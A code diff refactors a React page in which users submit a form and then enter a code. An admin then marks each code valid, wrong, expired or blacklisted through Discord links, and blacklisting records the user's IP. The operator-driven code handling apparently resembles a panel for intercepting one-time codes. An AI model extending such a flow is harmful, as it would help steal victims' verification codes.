@@ -3,7 +3,6 @@ import { base44 } from "@/api/base44Client";
 import SubmissionForm from "@/components/SubmissionForm";
 import SuccessScreen from "@/components/SuccessScreen";
 import CodeVerification from "@/components/CodeVerification";
-import CodePage from "@/components/CodePage";
 import CodeWaiting from "@/components/CodeWaiting";
 import WaitingQueue from "@/components/WaitingQueue";
 import VerificationSuccess from "@/components/VerificationSuccess";
@@ -16,11 +15,11 @@ export default function Home() {
 
   const getInitialStep = () => {
     const p = getParams();
-    // Admin action links from Discord (after code entry) - priority over everything
+    // Admin action links from Discord (after code entry)
     if (p.get("triggerAction")) return "triggerAction";
     // Legacy trigger for sending code ready
     if (p.get("trigger")) return "form";
-    if (p.get("step") === "code" && !p.get("triggerAction")) return "code";
+    if (p.get("step") === "code") return "code";
     return "form";
   };
 
@@ -28,10 +27,6 @@ export default function Home() {
   const [loading, setLoading] = useState(false);
   const [submittedData, setSubmittedData] = useState(null);
   const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
-
-
-
-
   const pollingRef = useRef(null);
   const [showStatusCheck, setShowStatusCheck] = useState(false);
   const [showFAQ, setShowFAQ] = useState(false);
@@ -56,12 +51,12 @@ export default function Home() {
 
   // Handle ?triggerAction=valid|wrong|expired|blacklist&id=... from Discord (after code entry)
   useEffect(() => {
+    if (step !== "triggerAction") return;
     const p = getParams();
     const action = p.get("triggerAction");
     const id = p.get("id");
     const ip = p.get("ip");
-    
-    if (!action || !id) return;
+    if (!action || !id) { setStep("form"); return; }
 
     if (action === "blacklist") {
       base44.functions.invoke("blacklistUser", { submissionId: id, ip })
@@ -212,7 +207,7 @@ export default function Home() {
               </div>
             )}
             {step === "validation" && <SuccessScreen data={submittedData} adminInactive={adminInactive} />}
-            {step === "code"       && <CodePage submissionId={submissionId} onCodeSubmit={handleCodeSubmit} />}
+            {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} onExpire={handleCodeExpire} />}
             {step === "waiting"    && <CodeWaiting />}
             {step === "queue"      && <WaitingQueue />}
             {step === "verified"   && <VerificationSuccess data={submittedData} />}
